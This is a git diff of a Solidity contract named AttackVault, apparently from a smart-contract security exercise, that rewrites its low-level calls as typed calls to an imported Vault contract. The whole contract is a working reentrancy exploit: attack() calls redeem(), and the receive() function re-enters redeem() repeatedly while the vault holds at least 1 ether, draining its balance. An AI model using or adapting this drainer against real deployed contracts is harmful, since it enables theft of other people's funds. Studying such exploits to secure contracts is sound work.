@@ -1,32 +1,26 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.4;
 
+import "./Vault.sol";
+
 contract AttackVault {
-    address VaultAddress = 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B;
+    Vault c;
+
+    constructor(Vault _contractAddress) {
+        c = Vault(_contractAddress);
+    }
 
     function store() public payable {
-        (bool success, ) =
-            address(VaultAddress).call{value: msg.value}(
-                abi.encodeWithSignature("store()")
-            );
-        require(success, "Transaction failed");
+        c.store{value: msg.value}();
     }
 
     function attack() public {
-        (bool success, ) =
-            address(VaultAddress).call{value: 0}(
-                abi.encodeWithSignature("redeem()")
-            );
-        require(success, "Attack failed");
+        c.redeem();
     }
 
     receive() external payable {
-        require(VaultAddress.balance >= 1 ether);
-        (bool success, ) =
-            address(VaultAddress).call{value: 0}(
-                abi.encodeWithSignature("redeem()")
-            );
-        require(success, "Transaction failed");
+        require(address(c).balance >= 1 ether);
+        c.redeem();
     }
 
     function getBalance() public view returns (uint256) {
